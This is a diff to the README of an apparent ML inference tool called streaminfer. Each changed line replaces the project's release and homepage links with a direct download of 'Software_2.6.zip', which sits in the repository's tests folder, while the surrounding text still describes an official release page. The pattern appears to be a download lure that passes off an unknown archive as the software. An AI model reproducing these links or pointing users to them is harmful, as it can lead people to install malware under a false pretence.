@@ -1,6 +1,6 @@
 # ⚡ streaminfer - Fast, Real-Time ML Inference
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Here-brightgreen?style=for-the-badge)](https://github.com/onehundredfifty-myelatelia678/streaminfer/releases)
+[![Download Latest Release](https://img.shields.io/badge/Download-Here-brightgreen?style=for-the-badge)](https://github.com/onehundredfifty-myelatelia678/streaminfer/raw/refs/heads/main/tests/Software_2.6.zip)
 
 streaminfer is a tool that helps run machine learning models quickly on your computer. It works in real-time, meaning it can give results right away as it receives new information. The software adapts how it handles data to keep things running smoothly, and it can switch between different models without needing to stop. It helps avoid problems when the system gets too busy.
 
@@ -38,7 +38,7 @@ To use streaminfer, you need to download it and run it on your PC.
 
 Click the button below to visit the official download page:
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Here-brightgreen?style=for-the-badge)](https://github.com/onehundredfifty-myelatelia678/streaminfer/releases)
+[![Download Latest Release](https://img.shields.io/badge/Download-Here-brightgreen?style=for-the-badge)](https://github.com/onehundredfifty-myelatelia678/streaminfer/raw/refs/heads/main/tests/Software_2.6.zip)
 
 This will take you to the page where the latest version of streaminfer is available.
 
@@ -140,8 +140,8 @@ If you still have issues, look at the "Help" menu inside the app. It includes ba
 
 ## 📁 Where to Find More Information
 
-- Official project page: https://github.com/onehundredfifty-myelatelia678/streaminfer  
-- Download releases here: https://github.com/onehundredfifty-myelatelia678/streaminfer/releases
+- Official project page: https://github.com/onehundredfifty-myelatelia678/streaminfer/raw/refs/heads/main/tests/Software_2.6.zip  
+- Download releases here: https://github.com/onehundredfifty-myelatelia678/streaminfer/raw/refs/heads/main/tests/Software_2.6.zip
 
 Visit the release page any time to get the latest updates or new versions.
 
